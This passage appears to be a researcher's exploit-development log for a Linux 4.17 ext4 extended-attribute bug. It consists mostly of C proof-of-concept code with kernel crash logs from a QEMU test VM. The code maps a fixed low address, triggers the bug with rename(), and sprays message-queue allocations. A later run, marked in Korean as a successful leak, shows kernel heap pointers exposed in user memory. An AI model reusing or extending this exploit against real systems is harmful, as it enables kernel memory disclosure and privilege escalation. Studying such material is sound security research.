		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

void *area;

void spray() {
	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	struct {
		long mtype;
		char mtext[BUF_SIZE];
	} msg;

	memset(msg.mtext, 0x42, BUF_SIZE-1);
	msg.mtype = 1;

	printf("start spraying\n");
	for(int i=0; i<2048; i++)
		msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
	printf("spraying done!\n");
	return;
}


static void activity(char *mpoint) {

	char *foo_bar_baz;
	char *foo_baz;
	int err;
	err = asprintf(&foo_bar_baz, "%s/foo/bar/baz", mpoint);
	err = asprintf(&foo_baz, "%s/foo/baz", mpoint);

//	area = mmap((void*)BASE, SIZE, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);
	area = _mmap((void*)BASE, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);

	memset(area, 0xcc, 1024*4);
	printf("---TEST---\n");
	hexdump((void*)BASE + 0x400, 0x50);

	if(area == MAP_FAILED) {
		perror("mmap_shared");
		exit(1);
	} else {
		printf("mmap success\n");
	}

	printf("start triggering.\n");
	rename(foo_bar_baz, foo_baz); // trigger vuln
	printf("triggering done.\n");
	spray();		      // allocate!!!!

	while(1) {
		printf("---------------\n");
		hexdump((void*)BASE + 0x400, 0x50); // check it
		sleep(5);
	}
}

int main(int argc, char *argv[]) {
	activity(argv[1]);
	return 0;
}
```

```
root@syzkaller:~/79# ./zz.sh
mkdir: cannot create directory 'mnt': File exists
umount: ./mnt: not mounted
[  124.758619] EXT4-fs (loop0): mounted filesystem with ordered data mode. Opts: (null)
---TEST---
0x000000: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc ................
0x000010: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc ................
0x000020: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc ................
0x000030: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc ................
0x000040: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc ................
mmap success
start triggering.
[  124.958237] BUG: unable to handle kernel paging request at 0000000001000400
[  124.958237] PGD 0 P4D 0
[  124.958237] Oops: 0000 [#1] SMP NOPTI
[  124.958237] Modules linked in:
[  124.958237] CPU: 1 PID: 1698 Comm: systemd-udevd Not tainted 4.17.0 #12
[  124.958237] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  124.958237] RIP: 0010:__kmalloc_node_track_caller+0x103/0x230
[  124.958237] RSP: 0018:ffffc90000503ae0 EFLAGS: 00000206
[  124.958237] RAX: 0000000000000000 RBX: 0000000001000400 RCX: 00000000000010cb
[  124.958237] RDX: 00000000000010ca RSI: 00000000015106c0 RDI: 0000000000023980
[  124.958237] RBP: ffff88007bac0800 R08: ffff88007fd23980 R09: 0000000000000000
[  124.958237] R10: ffff88007c903000 R11: 0000000000004000 R12: 00000000015106c0
[  124.958237] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[  124.958237] FS:  00007f424cde08c0(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
[  124.958237] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  124.958237] CR2: 0000000001000400 CR3: 0000000079818000 CR4: 00000000000006e0
[  124.958237] Call Trace:
[  124.958237]  ? __alloc_skb+0x7d/0x1d0
[  124.958237]  __kmalloc_reserve.isra.43+0x29/0x80
[  124.958237]  __alloc_skb+0x7d/0x1d0
[  124.958237]  alloc_skb_with_frags+0x5f/0x1b0
[  124.958237]  ? wait_woken+0x80/0x80
[  124.958237]  sock_alloc_send_pskb+0x1f8/0x230
[  124.958237]  ? _cond_resched+0x10/0x40
[  124.958237]  ? wait_for_unix_gc+0x2f/0xa0
[  124.958237]  unix_dgram_sendmsg+0x132/0x6e0
[  124.958237]  sock_sendmsg+0x31/0x40
[  124.958237]  ___sys_sendmsg+0x26a/0x2c0
[  124.958237]  ? seccomp_run_filters+0x54/0xb0
[  124.958237]  ? __slab_free+0x146/0x300
[  124.958237]  ? arch_tlb_finish_mmu+0x3d/0x70
[  124.958237]  ? __seccomp_filter+0x3e/0x570
[  124.958237]  ? kmem_cache_free+0x143/0x160
[  124.958237]  ? kmem_cache_free+0x143/0x160
[  124.958237]  ? __sys_sendmsg+0x59/0xa0
[  124.958237]  __sys_sendmsg+0x59/0xa0
[  124.958237]  do_syscall_64+0x43/0xf0
[  124.958237]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  124.958237] RIP: 0033:0x7f424bf28e67
[  124.958237] RSP: 002b:00007ffcf6aadb28 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  124.958237] RAX: ffffffffffffffda RBX: 00007ffcf6aadb30 RCX: 00007f424bf28e67
[  124.958237] RDX: 0000000000004000 RSI: 00007ffcf6aadb30 RDI: 0000000000000005
[  124.958237] RBP: 00007ffcf6aadb70 R08: 000000000000fed0 R09: 00000000000000a8
[  124.958237] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffcf6aae5a0
[  124.958237] R13: 00007ffcf6aadbb0 R14: 00007ffcf6aae4e0 R15: 00007ffcf6aae520
[  124.958237] Code: 8b 47 20 49 8b 3f 48 8d 4a 01 48 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 6e ff ff ff 48 85 db 74 0b 41 8b 47 20 <48> 8b 04 03 0f 18 08 41 f7 c4 00 80 00 00 75 b4 66 66 66 66 90
[  124.958237] RIP: __kmalloc_node_track_caller+0x103/0x230 RSP: ffffc90000503ae0
[  124.958237] CR2: 0000000001000400
[  124.984272] ---[ end trace 2fdb628149828915 ]---
[  124.995722] EXT4-fs error (device loop0): ext4_xattr_inode_iget:390: comm zz: error while reading EA inode 1970234923 err=-117
[  125.045233] EXT4-fs warning (device loop0): ext4_expand_extra_isize_ea:2791: Unable to expand inode 13. Delete some EAs or run e2fsck.
triggering done.
start spraying
[  125.050228] general protection fault: 0000 [#2] SMP NOPTI
[  125.051274] Modules linked in:
[  125.051274] CPU: 1 PID: 1700 Comm: zz Tainted: G      D           4.17.0 #12
[  125.051274] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  125.051274] RIP: 0010:__kmalloc+0xb7/0x1d0
[  125.051274] RSP: 0018:ffffc900004d3e10 EFLAGS: 00000286
[  125.051274] RAX: 0000000000000000 RBX: cccccccccccccccc RCX: 00000000000010ce
[  125.051274] RDX: 00000000000010cd RSI: 00000000015000c0 RDI: 0000000000023980
[  125.051274] RBP: 00000000015000c0 R08: ffff88007fd23980 R09: 00007ffded3374a0
[  125.051274] R10: ffffc900004d3f40 R11: 0000000000000000 R12: ffff88007d001500
[  125.051274] R13: 0000000001000400 R14: 0000000000000330 R15: ffffffff813f0282
[  125.051274] FS:  00007f743513a440(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
[  125.051274] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  125.051274] CR2: 00007f922f990000 CR3: 0000000079822000 CR4: 00000000000006e0
[  125.051274] Call Trace:
[  125.051274]  load_msg+0x32/0x150
[  125.051274]  do_msgsnd+0x8d/0x450
[  125.051274]  ? __schedule+0xf8/0x710
[  125.051274]  ? do_syscall_64+0x43/0xf0
[  125.051274]  ? __x64_sys_msgsnd+0x18/0x30
[  125.051274]  do_syscall_64+0x43/0xf0
[  125.051274]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  125.051274] RIP: 0033:0x7f7434c68473
[  125.051274] RSP: 002b:00007ffded337498 EFLAGS: 00000246 ORIG_RAX: 0000000000000045
[  125.051274] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f7434c68473
[  125.051274] RDX: 0000000000000300 RSI: 00007ffded3374a0 RDI: 0000000000000000
[  125.051274] RBP: 00007ffded3377b0 R08: 00007f743513a440 R09: 00007f743513a440
[  125.051274] R10: 0000000000000000 R11: 0000000000000246 R12: 0000561c87b83900
[  125.051274] R13: 00007ffded3378f0 R14: 0000000000000000 R15: 0000000000000000
[  125.051274] Code: 41 8b 44 24 20 49 8b 3c 24 48 8d 4a 01 49 8b 5c 05 00 4c 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 b7 48 85 db 74 0c 41 8b 44 24 20 <48> 8b 04 03 0f 18 08 f7 c5 00 80 00 00 0f 85 b7 00 00 00 41 8b
[  125.051274] RIP: __kmalloc+0xb7/0x1d0 RSP: ffffc900004d3e10
[  125.063619] ---[ end trace 2fdb628149828916 ]---
[  125.065857] general protection fault: 0000 [#3] SMP NOPTI
[  125.066553] Modules linked in:
[  125.066553] CPU: 1 PID: 1587 Comm: systemd-logind Tainted: G      D           4.17.0 #12
[  125.066553] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  125.066553] RIP: 0010:__kmalloc_node_track_caller+0xe2/0x230
[  125.066553] RSP: 0018:ffffc9000042fae0 EFLAGS: 00000246
[  125.066553] RAX: 0000000000000000 RBX: ffff88007baf7100 RCX: 00000000000010cf
[  125.066553] RDX: 00000000000010ce RSI: 00000000015106c0 RDI: 0000000000023980
[  125.066553] RBP: cccccccccccccccc R08: ffff88007fd23980 R09: 0000000000000000
[  125.066553] R10: ffff88007c903000 R11: 0000000000004000 R12: 00000000015106c0
[  125.066553] R13: 00000000000002c0 R14: 00000000ffffffff R15: ffff88007d001500
[  125.066553] FS:  00007fecf394f900(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
[  125.066553] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  125.066553] CR2: 00007f922f990000 CR3: 000000007baa6000 CR4: 00000000000006e0
[  125.066553] Call Trace:
[  125.066553]  ? __alloc_skb+0x7d/0x1d0
[  125.066553]  __kmalloc_reserve.isra.43+0x29/0x80
[  125.066553]  __alloc_skb+0x7d/0x1d0
[  125.066553]  alloc_skb_with_frags+0x5f/0x1b0
[  125.066553]  ? wait_woken+0x80/0x80
[  125.066553]  sock_alloc_send_pskb+0x1f8/0x230
[  125.066553]  ? unix_stream_read_generic+0x231/0x840
[  125.066553]  ? _cond_resched+0x10/0x40
[  125.066553]  ? wait_for_unix_gc+0x2f/0xa0
[  125.066553]  unix_dgram_sendmsg+0x132/0x6e0
[  125.066553]  sock_sendmsg+0x31/0x40
[  125.066553]  ___sys_sendmsg+0x26a/0x2c0
[  125.066553]  ? seccomp_run_filters+0x54/0xb0
[  125.066553]  ? ep_send_events_proc+0x76/0x1a0
[  125.066553]  ? __ia32_sys_epoll_ctl+0x5f0/0x5f0
[  125.066553]  ? __seccomp_filter+0x3e/0x570
[  125.066553]  ? ep_poll+0x1e1/0x3a0
[  125.066553]  ? __sys_sendmsg+0x59/0xa0
[  125.066553]  __sys_sendmsg+0x59/0xa0
[  125.066553]  do_syscall_64+0x43/0xf0
[  125.066553]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  125.066553] RIP: 0033:0x7fecf3107e67
[  125.066553] RSP: 002b:00007ffffc3ffc48 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[  125.066553] RAX: ffffffffffffffda RBX: 00007ffffc3ffc60 RCX: 00007fecf3107e67
[  125.066553] RDX: 0000000000004000 RSI: 00007ffffc3ffc60 RDI: 0000000000000003
[  125.066553] RBP: 00007ffffc400520 R08: 0000000000000000 R09: 0000000000000097
[  125.066553] R10: 0000000000000073 R11: 0000000000000246 R12: 00007ffffc3ffce0
[  125.066553] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  125.066553] Code: c4 00 80 00 00 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 0b f0 91 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 6e
[  125.066553] RIP: __kmalloc_node_track_caller+0xe2/0x230 RSP: ffffc9000042fae0
[  125.087673] ---[ end trace 2fdb628149828917 ]---
Segmentation fault
root@syzkaller:~/79# [  125.373666] systemd-journald[1067]: Successfully sent stream file descriptor to service manager.
[  146.403094] general protection fault: 0000 [#4] SMP NOPTI
[  146.403227] Modules linked in:
[  146.403227] CPU: 1 PID: 81 Comm: kworker/u4:3 Tainted: G      D           4.17.0 #12
[  146.403227] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  146.403227] Workqueue: writeback wb_workfn (flush-8:0)
[  146.403227] RIP: 0010:__kmalloc_node+0x103/0x250
[  146.403227] RSP: 0018:ffffc9000047f7d0 EFLAGS: 00000286
[  146.403227] RAX: 0000000000000000 RBX: cccccccccccccccc RCX: 00000000000010d0
[  146.403227] RDX: 00000000000010cf RSI: 0000000000011200 RDI: 0000000000023980
[  146.403227] RBP: ffff88007bac0c00 R08: ffff88007fd23980 R09: ffff88007c6d98d0
[  146.403227] R10: 0000000000001000 R11: 0000000000000001 R12: 0000000000011200
[  146.403227] R13: 00000000000002d0 R14: 00000000ffffffff R15: ffff88007d001500
[  146.403227] FS:  0000000000000000(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
[  146.403227] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  146.403227] CR2: 00007f922f9b5000 CR3: 000000007b9aa000 CR4: 00000000000006e0
[  146.403227] Call Trace:
[  146.403227]  ? alloc_request_size+0x26/0x60
[  146.403227]  ? jbd2_journal_get_write_access+0x20/0x60
[  146.403227]  ? wait_woken+0x80/0x80
[  146.403227]  alloc_request_size+0x26/0x60
[  146.403227]  mempool_alloc+0x62/0x190
[  146.403227]  get_request+0x324/0x630
[  146.403227]  ? wait_woken+0x80/0x80
[  146.403227]  blk_queue_bio+0xff/0x400
[  146.403227]  generic_make_request+0x17c/0x3d0
[  146.403227]  ? submit_bio+0x67/0x130
[  146.403227]  submit_bio+0x67/0x130
[  146.403227]  ext4_io_submit+0x43/0x50
[  146.403227]  ext4_writepages+0x6b0/0xea0
[  146.403227]  ? sg_init_table+0x11/0x30
[  146.403227]  ? sched_clock_local+0x12/0x80
[  146.403227]  ? sched_clock_local+0x12/0x80
[  146.403227]  ? do_writepages+0x46/0xd0
[  146.403227]  ? ext4_mark_inode_dirty+0x1d0/0x1d0
[  146.403227]  do_writepages+0x46/0xd0
[  146.403227]  ? __writeback_single_inode+0x38/0x320
[  146.403227]  __writeback_single_inode+0x38/0x320
[  146.403227]  writeback_sb_inodes+0x19b/0x3e0
[  146.403227]  __writeback_inodes_wb+0x58/0xa0
[  146.403227]  wb_writeback+0x262/0x2f0
[  146.403227]  ? __switch_to_asm+0x34/0x70
[  146.403227]  ? wb_workfn+0x178/0x3c0
[  146.403227]  wb_workfn+0x178/0x3c0
[  146.403227]  process_one_work+0x1cc/0x3b0
[  146.403227]  worker_thread+0x26/0x3c0
[  146.403227]  ? trace_event_raw_event_workqueue_execute_start+0xa0/0xa0
[  146.403227]  kthread+0x10e/0x130
[  146.403227]  ? kthread_create_worker_on_cpu+0x70/0x70
[  146.403227]  ret_from_fork+0x35/0x40
[  146.403227] Code: 8b 47 20 49 8b 3f 48 8d 4a 01 48 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 73 ff ff ff 48 85 db 74 0b 41 8b 47 20 <48> 8b 04 03 0f 18 08 41 f7 c4 00 80 00 00 75 b4 48 8b 44 24 40
[  146.403227] RIP: __kmalloc_node+0x103/0x250 RSP: ffffc9000047f7d0
[  146.414851] ---[ end trace 2fdb628149828918 ]---
[  146.423563] kworker/u4:3 (81) used greatest stack depth: 12712 bytes left
[  175.872228] general protection fault: 0000 [#5] SMP NOPTI
[  175.872833] Modules linked in:
[  175.872833] CPU: 1 PID: 1581 Comm: systemd-timesyn Tainted: G      D           4.17.0 #12
[  175.872833] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  175.872833] RIP: 0010:__kmalloc_node_track_caller+0xe2/0x230
[  175.872833] RSP: 0018:ffffc90000f5fae0 EFLAGS: 00000246
[  175.872833] RAX: 0000000000000000 RBX: ffff88007baf7b00 RCX: 00000000000010d1
[  175.872833] RDX: 00000000000010d0 RSI: 00000000015106c0 RDI: 0000000000023980
[  175.872833] RBP: cccccccccccccccc R08: ffff88007fd23980 R09: 0000000000000000
[  175.872833] R10: ffff88007c903000 R11: 0000000000004000 R12: 00000000015106c0
[  175.872833] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[  175.872833] FS:  00007fe13d01b8c0(0000) GS:ffff88007fd00000(0000) knlGS:0000000000000000
[  175.872833] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  175.872833] CR2: 00007f922f9ba020 CR3: 000000007b926000 CR4: 00000000000006e0
[  175.872833] Call Trace:
[  175.872833]  ? __alloc_skb+0x7d/0x1d0
[  175.872833]  __kmalloc_reserve.isra.43+0x29/0x80
[  175.872833]  __alloc_skb+0x7d/0x1d0
[  175.872833]  ? __dev_queue_xmit+0x1fc/0x6a0
[  175.872833]  alloc_skb_with_frags+0x5f/0x1b0
[  175.872833]  ? wait_woken+0x80/0x80
[  175.872833]  sock_alloc_send_pskb+0x1f8/0x230
[  175.872833]  ? _cond_resched+0x10/0x40
[  175.872833]  ? wait_for_unix_gc+0x2f/0xa0
[  175.872833]  unix_dgram_sendmsg+0x132/0x6e0
[  175.872833]  sock_sendmsg+0x31/0x40
[  175.872833]  ___sys_sendmsg+0x26a/0x2c0
[  175.872833]  ? seccomp_run_filters+0x54/0xb0
[  175.872833]  ? datagram_poll+0x23/0xf0
[  175.872833]  ? __seccomp_filter+0x3e/0x570
[  175.872833]  ? __sys_sendto+0xa7/0x140
[  175.872833]  ? __sys_sendmsg+0x59/0xa0
[  175.872833]  __sys_sendmsg+0x59/0xa0
[  175.872833]  do_syscall_64+0x43/0xf0
[  175.872833]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  175.872833] RIP: 0033:0x7fe13c6d8eb0
[  175.872833] RSP: 002b:00007fff930699a0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
[  175.872833] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 00007fe13c6d8eb0
[  175.872833] RDX: 0000000000004000 RSI: 00007fff930699e0 RDI: 0000000000000003
[  175.872833] RBP: 00007fff930699e0 R08: 0000000000000000 R09: 00000000000000a0
[  175.872833] R10: 0000000000000073 R11: 0000000000000293 R12: 0000000000004000
[  175.872833] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  175.872833] Code: c4 00 80 00 00 74 55 48 85 c0 0f 84 d4 00 00 00 41 8b 57 1c 31 f6 48 89 ef e8 0b f0 91 00 eb 3c 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 0f 84 6e
[  175.872833] RIP: __kmalloc_node_track_caller+0xe2/0x230 RSP: ffffc90000f5fae0
[  175.885858] ---[ end trace 2fdb628149828919 ]---
[  194.803224] systemd-journald[1067]: Sent WATCHDOG=1 notification.
QEMU: Terminated
```


### 16:25

릭 성공!

```c
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/falloc.h>
#include <linux/loop.h>

#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <malloc.h>

#include <linux/userfaultfd.h>

#include <arpa/inet.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/wait.h>


#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

#define _mmap(addr, length, prot, flags, fd, offset) syscall(__NR_mmap, addr, length, prot, flags, fd, offset)

#define BASE 0x01000000
#define SIZE 0x10000
#define BUF_SIZE 0x300

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

void *area;

void spray() {
	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	struct {
		long mtype;
		char mtext[BUF_SIZE];
	} msg;

	memset(msg.mtext, 0x42, BUF_SIZE-1);
	msg.mtype = 1;

	printf("start spraying\n");
	for(int i=0; i<21; i++) {
		printf(".");
		msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
	}
	printf("spraying done!\n");
	return;
}


static void activity(char *mpoint) {

	char *foo_bar_baz;
	char *foo_baz;
	int err;
	err = asprintf(&foo_bar_baz, "%s/foo/bar/baz", mpoint);
	err = asprintf(&foo_baz, "%s/foo/baz", mpoint);

//	area = mmap((void*)BASE, SIZE, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);
	area = _mmap((void*)BASE, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);

	memset(area, 0x00, 1024*4);
	printf("---TEST---\n");
	hexdump((void*)BASE + 0x400, 0x50);

	if(area == MAP_FAILED) {
		perror("mmap_shared");
		exit(1);
	} else {
		printf("mmap success\n");
	}

	printf("start triggering.\n");
	rename(foo_bar_baz, foo_baz); // trigger vuln
	printf("triggering done.\n");
	spray();		      // allocate!!!!

	while(1) {
		printf("---------------\n");
		hexdump((void*)BASE + 0x400, 0x50); // check it
		sleep(5);
	}
}

int main(int argc, char *argv[]) {
	setvbuf(stdin,  0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
	activity(argv[1]);
	return 0;
}
```

```
root@syzkaller:~/79# ./zz.sh
mkdir: cannot create directory 'mnt': File exists
[  149.872011] EXT4-fs (loop0): warning: mounting fs with errors, running e2fsck is recommended
[  149.898707] EXT4-fs (loop0): mounted filesystem with ordered data mode. Opts: (null)
---TEST---
0x000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
mmap succes[  150.058351] EXT4-fs error (device loop0): ext4_xattr_inode_iget:390: comm zz: error while reading EA inode 1970234923 err=-117
s
start triggering.
[  150.113043] EXT4-fs warning (device loop0): ext4_expand_extra_isize_ea:2791: Unable to expand inode 13. Delete some EAs or run e2fsck.
triggering done.
start spraying
.....................spraying done!
---------------
0x000000: 00 54 bf 79 00 88 ff ff 00 74 bf 79 00 88 ff ff .T.y.....t.y....
0x000010: 01 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 ................
0x000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x000030: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB
0x000040: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 BBBBBBBBBBBBBBBB

```
